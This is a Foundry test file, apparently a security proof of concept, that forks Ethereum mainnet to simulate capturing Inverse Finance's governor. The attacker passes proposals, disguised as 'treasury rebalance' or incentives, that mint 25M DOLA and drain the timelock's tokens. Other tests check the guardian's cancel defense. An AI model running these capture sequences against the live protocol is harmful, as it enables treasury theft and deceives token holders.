// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IVotesComp {
    function delegate(address) external;
    function getCurrentVotes(address) external view returns (uint96);
    function getPriorVotes(address, uint256) external view returns (uint96);
    function delegates(address) external view returns (address);
}

/// @dev Inverse GovernorMills (Compound Bravo fork with an extra xINV weight and a Guardian).
interface IGovernorMills {
    function name() external view returns (string memory);
    function propose(
        address[] memory targets,
        uint256[] memory values,
        string[] memory signatures,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    function castVote(uint256 proposalId, bool support) external;
    function queue(uint256 proposalId) external;
    function execute(uint256 proposalId) external;
    function cancel(uint256 proposalId) external;
    function state(uint256 proposalId) external view returns (uint8);
    function proposalCount() external view returns (uint256);
    function quorumVotes() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function timelock() external view returns (address);
    function guardian() external view returns (address);
    function setGuardian(address) external;
    function inv() external view returns (address);
    function xinv() external view returns (address);
    function getActions(uint256 proposalId)
        external
        view
        returns (address[] memory, uint256[] memory, string[] memory, bytes[] memory);
}

interface ITimelock {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function delay() external view returns (uint256);
    function GRACE_PERIOD() external view returns (uint256);
}

interface IDOLA {
    function operator() external view returns (address);
    function mint(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function minters(address) external view returns (bool);
}

interface IGuardian {
    function governorMills() external view returns (address);
    function deployer() external view returns (address);
    function rwg() external view returns (address);
    function cancellableProposals(uint256) external view returns (bool);
    function allowCancel(uint256, bool) external;
    function executeCancel(uint256) external;
}

interface ISafe {
    function getThreshold() external view returns (uint256);
    function getOwners() external view returns (address[] memory);
}

contract InverseCaptureTest is Test {
    address constant GOV = 0xBeCCB6bb0aa4ab551966A7E4B97cec74bb359Bf6;
    address constant TL = 0x926dF14a23BE491164dCF93f4c468A50ef659D5B;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant INV = 0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68;
    address constant XINV = 0x1637e4e9941D55703a7A5E7807d6aDA3f7DCD61B;
    address constant GUARDIAN = 0x941c2699eC7E55a50Bde030d8E1e70649839259D;
    address constant DEPLOYER = 0x3FcB35a1CbFB6007f9BC638D388958Bc4550cB28;
    address constant RWG = 0x4b6c63E6a94ef26E2dF60b89372db2d8e211F1B7;
    address constant DBR = 0xAD038Eb671c44b853887A7E32528FaB35dC5D710;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    uint256 constant FORK_BLOCK = 26_253_666;
    uint256 constant QUORUM = 24_000e18;
    uint256 constant THRESHOLD = 7_270e18;
    uint256 constant VOTING_DELAY = 1;
    uint256 constant VOTING_PERIOD = 17_280;
    uint256 constant TIMELOCK_DELAY = 172_800;

    address attacker = address(0xA11CE);
    address incumbent = 0x962228a90eaC69238c7D1F216d80037e61eA9255; // sole regular voter (~24.5k)
    uint256 constant INCUMBENT_INV_VOTES = 1_050.992305384156452106e18;
    uint256 constant INCUMBENT_XINV_VOTES = 2_999.079569948252647471e18;

    function setUp() public {
        string memory rpc = vm.envOr("BLOCKPI_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("NODEREAL_ETH_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("FORK_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://ethereum-rpc.publicnode.com";
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    /// @dev INV.balances is mapping(address => uint96) at storage slot 4
    /// (owner/tradable/seizable pack into slot 1).
    function _setInvBalance(address who, uint256 amount) internal {
        bytes32 slot = keccak256(abi.encode(who, uint256(4)));
        vm.store(INV, slot, bytes32(amount));
        assertEq(IERC20(INV).balanceOf(who), amount, "INV balance set");
    }

    // ------------------------------------------------------------------
    // 1. Live state
    // ------------------------------------------------------------------
    function test_live_state() public view {
        assertEq(IGovernorMills(GOV).name(), "Inverse Governor Mills");
        assertEq(IGovernorMills(GOV).quorumVotes(), QUORUM, "quorum");
        assertEq(IGovernorMills(GOV).proposalThreshold(), THRESHOLD, "threshold");
        assertEq(IGovernorMills(GOV).votingDelay(), VOTING_DELAY, "votingDelay");
        assertEq(IGovernorMills(GOV).votingPeriod(), VOTING_PERIOD, "votingPeriod");
        assertEq(IGovernorMills(GOV).timelock(), TL, "timelock");
        assertEq(IGovernorMills(GOV).guardian(), GUARDIAN, "governor guardian");
        assertEq(ITimelock(TL).admin(), GOV, "timelock admin = governor");
        assertEq(ITimelock(TL).pendingAdmin(), address(0), "no pending admin");
        assertEq(ITimelock(TL).delay(), TIMELOCK_DELAY, "timelock delay 2d");
        assertEq(ITimelock(TL).GRACE_PERIOD(), 1_209_600, "grace 14d");
        assertEq(IDOLA(DOLA).operator(), TL, "DOLA operator = timelock");
        assertEq(IGuardian(GUARDIAN).deployer(), DEPLOYER, "guardian deployer EOA");
        assertEq(IGuardian(GUARDIAN).rwg(), RWG, "guardian rwg safe");
        assertEq(ISafe(RWG).getThreshold(), 4, "rwg safe threshold");
        // Treasury INV is undelegated (cannot vote to defend itself).
        assertEq(IVotesComp(INV).delegates(TL), address(0), "timelock INV undelegated");
        // The sole regular voter barely clears quorum.
        assertEq(IVotesComp(INV).getCurrentVotes(incumbent), INCUMBENT_INV_VOTES, "incumbent INV votes");
        assertEq(IVotesComp(XINV).getCurrentVotes(incumbent), INCUMBENT_XINV_VOTES, "incumbent xINV votes");
        console2.log("DOLA totalSupply", IDOLA(DOLA).totalSupply() / 1e18);
        console2.log("timelock DOLA", IERC20(DOLA).balanceOf(TL) / 1e18);
        console2.log("timelock DBR", IERC20(DBR).balanceOf(TL) / 1e18);
    }

    // ------------------------------------------------------------------
    // 2. The mint authority is real: the timelock can mint uncapped DOLA.
    // ------------------------------------------------------------------
    function test_dola_mint_from_timelock_is_uncapped() public {
        uint256 supplyBefore = IDOLA(DOLA).totalSupply();
        assertFalse(IDOLA(DOLA).minters(attacker), "attacker not a minter");
        vm.prank(TL);
        IDOLA(DOLA).mint(attacker, 25_000_000e18);
        assertEq(IDOLA(DOLA).balanceOf(attacker), 25_000_000e18, "minted 25M DOLA");
        assertEq(IDOLA(DOLA).totalSupply(), supplyBefore + 25_000_000e18, "supply up 25M");
    }

    function test_dola_mint_from_attacker_reverts() public {
        vm.prank(attacker);
        vm.expectRevert(bytes("ONLY MINTERS OR OPERATOR"));
        IDOLA(DOLA).mint(attacker, 1e18);
    }

    // ------------------------------------------------------------------
    // 3. Full capture: propose -> vote -> queue -> execute -> arbitrary mint.
    // ------------------------------------------------------------------
    function _mintPayload(address recipient)
        internal
        pure
        returns (address[] memory targets, uint256[] memory values, string[] memory signatures, bytes[] memory calldatas)
    {
        targets = new address[](1);
        values = new uint256[](1);
        signatures = new string[](1);
        calldatas = new bytes[](1);
        targets[0] = DOLA;
        values[0] = 0;
        signatures[0] = "mint(address,uint256)";
        // Compound-Bravo convention: calldata carries only the encoded arguments;
        // the selector is derived from `signatures`.
        calldatas[0] = abi.encode(recipient, 25_000_000e18);
    }

    function _runCapture(uint256 attackerVotes, string memory desc)
        internal
        returns (uint256 pid, bool succeeded)
    {
        _setInvBalance(attacker, attackerVotes);
        vm.prank(attacker);
        IVotesComp(INV).delegate(attacker);
        // getPriorVotes(proposer, block.number-1) is checked in propose(); the delegation
        // checkpoint must be at least one block old.
        vm.roll(block.number + 1);

        (address[] memory t, uint256[] memory v, string[] memory s, bytes[] memory c) = _mintPayload(attacker);
        vm.prank(attacker);
        pid = IGovernorMills(GOV).propose(t, v, s, c, desc);

        vm.roll(block.number + VOTING_DELAY + 1); // Active
        vm.prank(attacker);
        IGovernorMills(GOV).castVote(pid, true);

        vm.roll(block.number + VOTING_PERIOD + 1);
        succeeded = IGovernorMills(GOV).state(pid) == 4; // Succeeded
        if (succeeded) {
            IGovernorMills(GOV).queue(pid);
            vm.warp(block.timestamp + TIMELOCK_DELAY + 1);
            IGovernorMills(GOV).execute(pid);
        }
    }

    function test_capture_mint_25m_dola() public {
        (uint256 pid, bool ok) = _runCapture(30_000e18, "DOLA liquidity incentive");
        assertTrue(ok, "proposal succeeded");
        assertEq(IGovernorMills(GOV).state(pid), 7, "executed");
        assertEq(IDOLA(DOLA).balanceOf(attacker), 25_000_000e18, "attacker minted 25M DOLA");
        console2.log("attacker DOLA", IDOLA(DOLA).balanceOf(attacker) / 1e18);
    }

    // ------------------------------------------------------------------
    // 4. The capture works with exactly the quorum (24,000 INV).
    // ------------------------------------------------------------------
    function test_capture_with_exact_quorum_only() public {
        (uint256 pid, bool ok) = _runCapture(QUORUM, "DOLA incentive");
        assertTrue(ok, "quorum-only capture succeeds");
        assertEq(IGovernorMills(GOV).state(pid), 7, "executed");
        assertEq(IDOLA(DOLA).balanceOf(attacker), 25_000_000e18, "25M DOLA");
    }

    // ------------------------------------------------------------------
    // 5. Also drain the timelock's direct token balance in the same proposal.
    // ------------------------------------------------------------------
    function test_capture_drains_timelock_assets() public {
        uint256 dolaTL = IERC20(DOLA).balanceOf(TL);
        uint256 dbrTL = IERC20(DBR).balanceOf(TL);
        uint256 wbtcTL = IERC20(WBTC).balanceOf(TL);
        uint256 invTL = IERC20(INV).balanceOf(TL);

        address[] memory t = new address[](5);
        uint256[] memory v = new uint256[](5);
        string[] memory s = new string[](5);
        bytes[] memory c = new bytes[](5);
        t[0] = DOLA; s[0] = "mint(address,uint256)"; c[0] = abi.encode(attacker, 25_000_000e18);
        t[1] = DOLA; s[1] = "transfer(address,uint256)"; c[1] = abi.encode(attacker, dolaTL);
        t[2] = DBR;  s[2] = "transfer(address,uint256)"; c[2] = abi.encode(attacker, dbrTL);
        t[3] = WBTC; s[3] = "transfer(address,uint256)"; c[3] = abi.encode(attacker, wbtcTL);
        t[4] = INV;  s[4] = "transfer(address,uint256)"; c[4] = abi.encode(attacker, invTL);

        _setInvBalance(attacker, 30_000e18);
        vm.prank(attacker);
        IVotesComp(INV).delegate(attacker);
        vm.roll(block.number + 1);
        vm.prank(attacker);
        uint256 pid = IGovernorMills(GOV).propose(t, v, s, c, "treasury rebalance");
        vm.roll(block.number + VOTING_DELAY + 1);
        vm.prank(attacker);
        IGovernorMills(GOV).castVote(pid, true);
        vm.roll(block.number + VOTING_PERIOD + 1);
        assertEq(IGovernorMills(GOV).state(pid), 4, "succeeded");
        IGovernorMills(GOV).queue(pid);
        vm.warp(block.timestamp + TIMELOCK_DELAY + 1);
        IGovernorMills(GOV).execute(pid);

        assertEq(IDOLA(DOLA).balanceOf(attacker), 25_000_000e18 + dolaTL, "DOLA minted + drained");
        assertEq(IERC20(DBR).balanceOf(attacker), dbrTL, "DBR drained");
        assertEq(IERC20(WBTC).balanceOf(attacker), wbtcTL, "WBTC drained");
        assertEq(IERC20(INV).balanceOf(attacker), 30_000e18 + invTL, "INV drained");
        console2.log("drained DBR", dbrTL / 1e18);
        console2.log("drained WBTC", wbtcTL);
    }

    // ------------------------------------------------------------------
    // 6. The guardian stops it — but requires BOTH parties.
    // ------------------------------------------------------------------
    function test_guardian_cancels_capture() public {
        _setInvBalance(attacker, 30_000e18);
        vm.prank(attacker);
        IVotesComp(INV).delegate(attacker);
        vm.roll(block.number + 1);
        (address[] memory t, uint256[] memory v, string[] memory s, bytes[] memory c) = _mintPayload(attacker);
        vm.prank(attacker);
        uint256 pid = IGovernorMills(GOV).propose(t, v, s, c, "DOLA incentive");
        vm.roll(block.number + VOTING_DELAY + 1);
        vm.prank(attacker);
        IGovernorMills(GOV).castVote(pid, true);
        vm.roll(block.number + VOTING_PERIOD + 1);
        assertEq(IGovernorMills(GOV).state(pid), 4, "would succeed without guardian");

        // Party 1: deployer EOA flags the proposal cancellable.
        vm.prank(DEPLOYER);
        IGuardian(GUARDIAN).allowCancel(pid, true);
        // Party 2: the 4/7 Safe executes the cancel.
        vm.prank(RWG);
        IGuardian(GUARDIAN).executeCancel(pid);
        assertEq(IGovernorMills(GOV).state(pid), 2, "canceled");
        assertEq(IDOLA(DOLA).balanceOf(attacker), 0, "no mint");
    }

    function test_guardian_requires_both_parties() public {
        _setInvBalance(attacker, 30_000e18);
        vm.prank(attacker);
        IVotesComp(INV).delegate(attacker);
        vm.roll(block.number + 1);
        (address[] memory t, uint256[] memory v, string[] memory s, bytes[] memory c) = _mintPayload(attacker);
        vm.prank(attacker);
        uint256 pid = IGovernorMills(GOV).propose(t, v, s, c, "DOLA incentive");

        // rwg cannot executeCancel without the deployer's allowCancel.
        vm.prank(RWG);
        vm.expectRevert(bytes("Guardian: not cancellable"));
        IGuardian(GUARDIAN).executeCancel(pid);

        // Only the deployer can allowCancel.
        vm.prank(attacker);
        vm.expectRevert(bytes("Guardian: not deployer"));
        IGuardian(GUARDIAN).allowCancel(pid, true);

        // Only the rwg Safe can executeCancel.
        vm.prank(DEPLOYER);
        IGuardian(GUARDIAN).allowCancel(pid, true);
        vm.prank(attacker);
        vm.expectRevert(bytes("Guardian: not rwg"));
        IGuardian(GUARDIAN).executeCancel(pid);
    }

    function test_deployer_eoa_is_a_safe_owner() public view {
        address[] memory owners = ISafe(RWG).getOwners();
        bool found = false;
        for (uint256 i = 0; i < owners.length; i++) {
            if (owners[i] == DEPLOYER) found = true;
        }
        assertTrue(found, "deployer EOA is a rwg Safe owner");
        assertEq(owners.length, 7, "7 owners, 4-of-7");
        console2.log("rwg Safe owners", owners.length);
    }

    function test_governor_guardian_cannot_be_changed_by_attacker() public {
        // The proposal executor is the timelock, never the Guardian contract, so the
        // guardian-only admin helpers are unreachable by an attacker.
        assertEq(IGovernorMills(GOV).guardian(), GUARDIAN, "guardian fixed");
        // A hostile action can never call setGuardian(attacker) because msg.sender would
        // be the timelock, not the guardian.
        vm.prank(attacker);
        vm.expectRevert(bytes("GovernorMills::setGuardian: only guardian"));
        IGovernorMills(GOV).setGuardian(attacker);
    }
}
